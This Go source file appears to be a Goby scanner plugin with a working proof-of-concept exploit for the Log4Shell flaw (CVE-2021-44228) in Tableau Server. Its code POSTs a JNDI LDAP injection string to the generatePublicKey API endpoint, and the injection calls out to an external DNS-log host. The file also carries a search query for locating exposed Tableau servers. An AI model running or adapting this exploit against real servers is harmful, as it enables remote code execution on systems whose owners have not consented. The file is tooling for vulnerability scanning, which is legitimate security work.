package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "Tableau Server log4j2 generatePublicKey Component RCE (CVE-2021-44228)",
    "Description": "<p>Tableau Software Server is a set of file hosting servers from Tableau Software. This product is mainly used to manage and share data visualization, interactive dashboards, workbooks and reports created by Tableau Desktop data visualization software.</p><p>Tableau Server has a CVE-2021-44228 vulnerability. Attackers can use the vulnerability to execute code remotely and control server permissions.</p>",
    "Impact": "<p>Tableau Server log4j2 RCE (CVE-2021-44228)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.tableau.com\">https://www.tableau.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Tableau Server",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Tableau Server log4j2 generatePublicKey 组件命令执行漏洞 (CVE-2021-44228)",
            "Product": "Tableau Server",
            "Description": "<p>Tableau Software Server是美国塔谱软件（Tableau Software）公司的一套文件托管服务器。该产品主要用于管理、共享Tableau Desktop数据可视化软件创建的数据可视化、交互式仪表板、工作簿和报告等。</p><p>Tableau Server存在CVE-2021-44228漏洞，攻击者可利用漏洞远程执行代码，控制服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.tableau.com\">https://www.tableau.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Tableau Server存在CVE-2021-44228漏洞，攻击者可利用漏洞远程执行代码，控制服务器权限。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Tableau Server log4j2 generatePublicKey Component RCE (CVE-2021-44228)",
            "Product": "Tableau Server",
            "Description": "<p>Tableau Software Server is a set of file hosting servers from Tableau Software. This product is mainly used to manage and share data visualization, interactive dashboards, workbooks and reports created by Tableau Desktop data visualization software.</p><p>Tableau Server has a CVE-2021-44228 vulnerability. Attackers can use the vulnerability to execute code remotely and control server permissions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.tableau.com\">https://www.tableau.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Tableau Server log4j2 RCE (CVE-2021-44228)</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "banner=\"Server: Tableau\" || header=\"Server: Tableau\"",
    "GobyQuery": "banner=\"Server: Tableau\" || header=\"Server: Tableau\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.tableau.com/",
    "DisclosureDate": "2022-01-04",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CNVD": [
        "CNVD-2021-95914"
    ],
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "dnslog",
            "type": "input",
            "value": "${jndi:ldap://${hostName}.xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10248"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := fmt.Sprintf("${jndi:ldap://%s}", checkUrl)
			uri2 := "/vizportal/api/web/v1/generatePublicKey"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Content-Type", "application/json;charset=UTF-8")
			cfg2.Data = fmt.Sprintf(`{"method":"%s","params":{}}`, cmd)
			httpclient.DoHttpRequest(u, cfg2)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["dnslog"].(string)
			uri2 := "/vizportal/api/web/v1/generatePublicKey"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Content-Type", "application/json;charset=UTF-8")
			cfg2.Data = fmt.Sprintf(`{"method":"%s","params":{}}`, cmd)
			httpclient.DoHttpRequest(expResult.HostInfo, cfg2)
			expResult.Output = "see your dnslog"
			expResult.Success = true
			return expResult
		},
	))
}
